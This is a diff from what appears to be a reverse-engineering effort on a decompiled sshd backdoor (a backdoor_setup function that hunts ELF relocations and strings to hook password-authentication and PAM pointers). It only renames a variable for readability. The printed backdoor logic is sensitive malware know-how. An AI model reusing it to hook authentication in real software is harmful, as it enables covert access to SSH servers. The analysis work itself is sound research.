@@ -44,7 +44,7 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   undefined4 uVar19;
   undefined4 uVar20;
   undefined4 uVar21;
-  bool bVar22;
+  BOOL used_relr_lookup;
   undefined8 uVar23;
   elf_info_t *elf_info;
   byte bVar24;
@@ -439,7 +439,7 @@ LAB_00105951:
               else {
                 puVar61 = (u8 *)psVar17->mm_answer_authpassword_end;
               }
-              bVar22 = false;
+              used_relr_lookup = false;
               pcVar37 = (char *)0x0;
               local_a90 = CONCAT44(local_a90._4_4_,0x198);
               while (pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a90,pcVar37),
@@ -449,7 +449,7 @@ LAB_00105951:
                 mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
                 if (mem_address == (Elf64_Rela *)0x0) {
                   local_9d8._0_8_ = (u8 *)0x0;
-                  bVar22 = true;
+                  used_relr_lookup = true;
                   mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
                 }
                 while (mem_address != (Elf64_Rela *)0x0) {
@@ -476,18 +476,18 @@ LAB_00105951:
                         ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = piVar43;
                       }
                       stringId_inOut = (EncodedStringId *)local_9d8;
-                      bVar22 = false;
+                      used_relr_lookup = false;
                       local_9d8._8_4_ = 0x70;
                       local_9d8._0_8_ = (u8 *)0xc5800000948;
                       goto LAB_00106471;
                     }
-                    if (bVar22) goto LAB_001063c8;
+                    if (used_relr_lookup) goto LAB_001063c8;
                     mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
                   } while (mem_address != (Elf64_Rela *)0x0);
                   local_9d8._0_8_ = (u8 *)0x0;
 LAB_001063c8:
                   mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
-                  bVar22 = true;
+                  used_relr_lookup = true;
                 }
                 pcVar37 = pcVar37 + 8;
               }
@@ -510,7 +510,7 @@ LAB_00106471:
   do {
     pcVar37 = elf_find_string(peVar31,stringId_inOut,(void *)0x0);
     if (pcVar37 != (char *)0x0) {
-      if (bVar22) {
+      if (used_relr_lookup) {
         psVar52 = (local_b10->global_ctx).sshd_ctx;
         psVar52->_unknown1186[0] = '\x01';
         psVar52->_unknown1186[1] = '\0';
@@ -518,7 +518,7 @@ LAB_00106471:
         psVar52->_unknown1186[3] = '\0';
         goto LAB_001064b8;
       }
-      bVar22 = true;
+      used_relr_lookup = true;
     }
     stringId_inOut = stringId_inOut + 1;
   } while (stringId_inOut != (EncodedStringId *)(local_9d8 + 0xc));
